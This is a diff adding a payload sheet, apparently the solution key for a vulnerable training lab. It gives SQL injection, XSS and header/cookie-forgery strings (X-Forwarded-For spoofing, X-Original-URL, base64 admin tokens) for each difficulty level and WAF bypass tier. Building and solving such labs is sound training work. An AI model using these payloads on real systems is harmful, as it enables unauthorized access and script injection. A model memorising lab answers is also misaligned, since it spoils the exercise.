@@ -1,0 +1,50 @@
+1. SQL INJECTION (/sqli)
+
+Low:
+' OR 1=1 --
+
+Medium:
+admin'/**/OR/**/1=1--
+
+High:
+admin'AND'1'='1
+
+WAF Bypass (обходит L1, блокируется на L2):
+admin'AND'a'='a
+
+
+--------------------------------------------------------------------
+2. XSS (/xss)
+
+Low:
+<script>alert(1)</script>
+
+Medium:
+<img src=x onerror=alert(1)>
+
+High:
+<details open ontoggle=alert(1)>XSS</details>
+
+WAF Bypass (обходит L1, блокируется на L2):
+<input autofocus onfocus=alert(1)>
+
+
+--------------------------------------------------------------------
+3. BURP SUITE (POST /vault)
+
+Low:
+is_admin=true
+Cookie: user_role=admin
+
+Medium:
+X-Forwarded-For: 127.0.0.1
+Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==
+
+High:
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin/vault
+Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==; vault_sig=52c876f2a69205692536a1f2857b4e4c70312142b068e23f4d87d506680183c5
+
+WAF Bypass (обходит L1, блокируется на L2):
+X-Forwarded-For: localhost
+Cookie: user_role=guest; auth_token=dXNlcj1BRE1JTg==
